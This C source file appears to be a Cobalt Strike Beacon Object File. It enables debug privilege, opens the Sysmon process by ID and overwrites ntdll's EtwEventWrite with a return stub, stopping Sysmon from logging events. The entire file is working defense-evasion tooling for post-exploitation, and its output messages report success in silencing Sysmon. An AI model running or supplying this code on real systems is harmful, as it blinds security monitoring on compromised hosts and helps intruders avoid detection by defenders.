#include <winternl.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include "silencesysmon.h"
#include "beacon.h"


BOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) {
	HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

	if (!Advapi32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) return FALSE;
    if (!Advapi32$LookupPrivilegeValueA(NULL, lpszPrivilege, &luid)) return FALSE; 

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    if (bEnablePrivilege) tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    else tp.Privileges[0].Attributes = 0;

    if (!Advapi32$AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES) NULL, (PDWORD) NULL) ) return FALSE; 
    if (KERNEL32$GetLastError() == ERROR_NOT_ALL_ASSIGNED) return FALSE;

    return TRUE;
}


int SilentSysmon(HANDLE hProc) {
	HANDLE hThread = NULL;
	unsigned char sEtwEventWrite[] = { 'E','t','w','E','v','e','n','t','W','r','i','t','e', 0x0 };
	
	void * pEventWrite = GetProcAddress(GetModuleHandle("ntdll.dll"), (LPCSTR) sEtwEventWrite);
#ifdef _WIN64
	char patch[] = "\x48\x33\xc0\xc3";
#else
	char patch[] = "\x33\xc0\xc2\x14\x00";
#endif

	KERNEL32$WriteProcessMemory(hProc, pEventWrite, (PVOID) patch, (SIZE_T) sizeof(patch), (SIZE_T *) NULL);
	KERNEL32$FlushInstructionCache(hProc, pEventWrite, 4096);

	return 0;
}


int go(char *args, int len) {
	int pid = 0;
    HANDLE hProc = NULL;
	datap parser;

	BeaconDataParse(&parser, args, len);
	pid = BeaconDataInt(&parser);

	if (!SetPrivilege(SE_DEBUG_NAME, ENABLE)) {
		BeaconPrintf(CALLBACK_ERROR, "Not enough privileges to silence Sysmon.\n");
		return 0;
	}

	if (pid) {
		hProc = KERNEL32$OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, (DWORD) pid);

		if (hProc != NULL) {
			SilentSysmon(hProc);
			BeaconPrintf(CALLBACK_OUTPUT, "[+] DONE! Sysmon successfully silenced!\n");
			KERNEL32$CloseHandle(hProc);
		}
		else BeaconPrintf(CALLBACK_ERROR, "Failed to open a handle to the Sysmon process!\n");
	}
	else BeaconPrintf(CALLBACK_ERROR, "Please specify the correct process ID of the Sysmon service!\n");
	

	return 0;
}
